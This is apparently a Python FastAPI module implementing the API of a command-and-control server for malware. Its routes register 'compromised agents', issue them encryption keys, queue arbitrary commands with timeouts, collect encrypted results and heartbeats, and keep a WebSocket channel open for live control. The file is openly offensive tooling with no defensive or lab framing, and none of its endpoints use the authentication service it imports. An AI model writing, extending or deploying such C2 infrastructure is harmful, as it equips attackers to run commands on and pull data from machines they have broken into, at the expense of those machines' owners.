"""
C2 Server API Routes
API endpoints สำหรับ C2 server management
"""

from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect
from typing import Dict, List, Optional
from datetime import datetime
from pydantic import BaseModel

from api.services.database import Database
from api.services.auth import AuthService
from services.c2_server import C2Server
from core.logger import log


# Pydantic models
class AgentRegistration(BaseModel):
    hostname: str
    ip_address: str
    os_info: str
    protocol: str = "http"
    metadata: Dict = {}


class CommandRequest(BaseModel):
    agent_id: str
    command: str
    timeout: int = 300


class TaskResult(BaseModel):
    agent_id: str
    task_id: str
    encrypted_result: str


class HeartbeatData(BaseModel):
    agent_id: str
    data: Dict = {}


# Router
router = APIRouter(prefix="/c2", tags=["C2 Server"])

# Global C2 server instance (will be initialized in main.py)
c2_server: Optional[C2Server] = None


def get_c2_server():
    """Dependency to get C2 server instance"""
    if not c2_server:
        raise HTTPException(status_code=503, detail="C2 Server not initialized")
    return c2_server


@router.post("/register")
async def register_agent(
    agent_info: AgentRegistration,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Register new compromised agent
    
    Returns:
        agent_id and encryption_key
    """
    try:
        agent_id = await c2.register_agent(agent_info.dict())
        
        return {
            "success": True,
            "agent_id": agent_id,
            "encryption_key": c2.get_encryption_key().decode(),
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] Agent registration failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/command")
async def send_command(
    cmd: CommandRequest,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Send command to agent
    
    Returns:
        task_id
    """
    try:
        task_id = await c2.send_command(
            cmd.agent_id,
            cmd.command,
            cmd.timeout
        )
        
        return {
            "success": True,
            "task_id": task_id,
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] Send command failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/tasks/{agent_id}")
async def get_pending_tasks(
    agent_id: str,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Get pending tasks for agent
    
    Returns:
        List of pending tasks
    """
    try:
        tasks = await c2.get_pending_tasks(agent_id)
        
        return {
            "success": True,
            "agent_id": agent_id,
            "tasks": tasks,
            "count": len(tasks),
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] Get tasks failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/result")
async def submit_result(
    result: TaskResult,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Submit task result from agent
    
    Returns:
        Success confirmation
    """
    try:
        await c2.receive_result(
            result.agent_id,
            result.task_id,
            result.encrypted_result
        )
        
        return {
            "success": True,
            "task_id": result.task_id,
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] Submit result failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/heartbeat")
async def heartbeat(
    hb: HeartbeatData,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Agent heartbeat
    
    Returns:
        Success confirmation
    """
    try:
        await c2.update_agent_heartbeat(hb.agent_id, hb.data)
        
        return {
            "success": True,
            "agent_id": hb.agent_id,
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] Heartbeat failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/agents")
async def list_agents(
    status: Optional[str] = None,
    c2: C2Server = Depends(get_c2_server)
):
    """
    List all agents
    
    Args:
        status: Filter by status (optional)
    
    Returns:
        List of agents
    """
    try:
        agents = await c2.list_agents(status)
        
        return {
            "success": True,
            "agents": agents,
            "count": len(agents),
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] List agents failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/agent/{agent_id}")
async def get_agent(
    agent_id: str,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Get agent information
    
    Returns:
        Agent info
    """
    try:
        agent = await c2.get_agent(agent_id)
        
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")
        
        return {
            "success": True,
            "agent": agent,
            "timestamp": datetime.now().isoformat()
        }
    
    except HTTPException:
        raise
    except Exception as e:
        log.error(f"[C2API] Get agent failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/agent/{agent_id}/deactivate")
async def deactivate_agent(
    agent_id: str,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Deactivate agent
    
    Returns:
        Success confirmation
    """
    try:
        await c2.deactivate_agent(agent_id)
        
        return {
            "success": True,
            "agent_id": agent_id,
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        log.error(f"[C2API] Deactivate agent failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/task/{task_id}")
async def get_task_status(
    task_id: str,
    c2: C2Server = Depends(get_c2_server)
):
    """
    Get task status
    
    Returns:
        Task info
    """
    try:
        task = await c2.get_task_status(task_id)
        
        if not task:
            raise HTTPException(status_code=404, detail="Task not found")
        
        return {
            "success": True,
            "task": task,
            "timestamp": datetime.now().isoformat()
        }
    
    except HTTPException:
        raise
    except Exception as e:
        log.error(f"[C2API] Get task status failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.websocket("/ws/{agent_id}")
async def websocket_endpoint(
    websocket: WebSocket,
    agent_id: str,
    c2: C2Server = Depends(get_c2_server)
):
    """
    WebSocket endpoint for real-time C2 communication
    """
    await websocket.accept()
    log.info(f"[C2API] WebSocket connected for agent {agent_id}")
    
    try:
        while True:
            # Receive data from agent
            data = await websocket.receive_json()
            
            # Handle different message types
            msg_type = data.get("type")
            
            if msg_type == "heartbeat":
                await c2.update_agent_heartbeat(agent_id, data.get("data", {}))
                await websocket.send_json({"type": "ack", "timestamp": datetime.now().isoformat()})
            
            elif msg_type == "result":
                await c2.receive_result(
                    agent_id,
                    data.get("task_id"),
                    data.get("encrypted_result")
                )
                await websocket.send_json({"type": "ack", "timestamp": datetime.now().isoformat()})
            
            elif msg_type == "get_tasks":
                tasks = await c2.get_pending_tasks(agent_id)
                await websocket.send_json({
                    "type": "tasks",
                    "tasks": tasks,
                    "timestamp": datetime.now().isoformat()
                })
            
            else:
                await websocket.send_json({
                    "type": "error",
                    "message": f"Unknown message type: {msg_type}"
                })
    
    except WebSocketDisconnect:
        log.info(f"[C2API] WebSocket disconnected for agent {agent_id}")
    except Exception as e:
        log.error(f"[C2API] WebSocket error: {e}")
        await websocket.close()


def init_c2_server(db: Database) -> C2Server:
    """
    Initialize C2 server
    
    Args:
        db: Database instance
    
    Returns:
        C2Server instance
    """
    global c2_server
    c2_server = C2Server(db)
    return c2_server

